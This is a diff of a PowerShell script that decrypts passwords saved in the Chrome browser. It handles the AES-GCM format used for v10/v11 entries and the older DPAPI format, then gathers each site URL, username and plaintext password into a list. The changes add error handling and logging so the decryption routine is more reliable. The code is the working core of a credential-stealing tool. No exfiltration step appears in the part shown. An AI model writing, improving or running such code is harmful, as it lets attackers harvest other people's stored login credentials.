@@ -132,25 +132,42 @@ try {
                 continue
             }
             
-            # Check version
-            if ($encPass[0] -eq 118 -and $encPass[1] -eq 49 -and $encPass[2] -eq 48) {
-                # v10 - AES GCM
-                $nonce = $encPass[3..14]
-                $ciphertext = $encPass[15..($encPass.Length - 17)]
-                $tag = $encPass[($encPass.Length - 16)..($encPass.Length - 1)]
+            $password = $null
+            
+            # Check version byte (v10, v11, etc.)
+            if ($encPass[0] -eq 118) {  # 'v' in ASCII
+                # Version 10/11 - AES GCM
+                Log "Using AES-GCM for: $url"
                 
-                $aes = New-Object Security.Cryptography.AesGcm($key)
-                $plaintext = New-Object byte[] $ciphertext.Length
-                $aes.Decrypt($nonce, $ciphertext, $tag, $plaintext)
-                
-                $password = [Text.Encoding]::UTF8.GetString($plaintext)
+                try {
+                    $nonce = $encPass[3..14]
+                    $ciphertext = $encPass[15..($encPass.Length - 17)]
+                    $tag = $encPass[($encPass.Length - 16)..($encPass.Length - 1)]
+                    
+                    # Create AES-GCM cipher
+                    $aes = [Security.Cryptography.AesGcm]::new($key)
+                    $plaintext = New-Object byte[] $ciphertext.Length
+                    
+                    $aes.Decrypt($nonce, $ciphertext, $tag, $plaintext)
+                    
+                    $password = [Text.Encoding]::UTF8.GetString($plaintext)
+                    Log "Decrypted successfully: $url"
+                } catch {
+                    Log "AES-GCM failed for $url : $($_.Exception.Message)"
+                }
             } else {
-                # Old DPAPI
-                $decrypted = [Security.Cryptography.ProtectedData]::Unprotect($encPass, $null, 'CurrentUser')
-                $password = [Text.Encoding]::UTF8.GetString($decrypted)
+                # Old DPAPI method (Chrome before v80)
+                Log "Using DPAPI for: $url"
+                try {
+                    $decrypted = [Security.Cryptography.ProtectedData]::Unprotect($encPass, $null, 'CurrentUser')
+                    $password = [Text.Encoding]::UTF8.GetString($decrypted)
+                    Log "Decrypted successfully: $url"
+                } catch {
+                    Log "DPAPI failed for $url : $($_.Exception.Message)"
+                }
             }
             
-            if ($username -or $password) {
+            if ($password -and ($username -or $password)) {
                 $passwords += @{
                     URL = $url
                     User = $username
@@ -158,7 +175,7 @@ try {
                 }
             }
         } catch {
-            Log "Failed to decrypt entry: $($_.Exception.Message)"
+            Log "Failed to process entry: $($_.Exception.Message)"
         }
     }
     
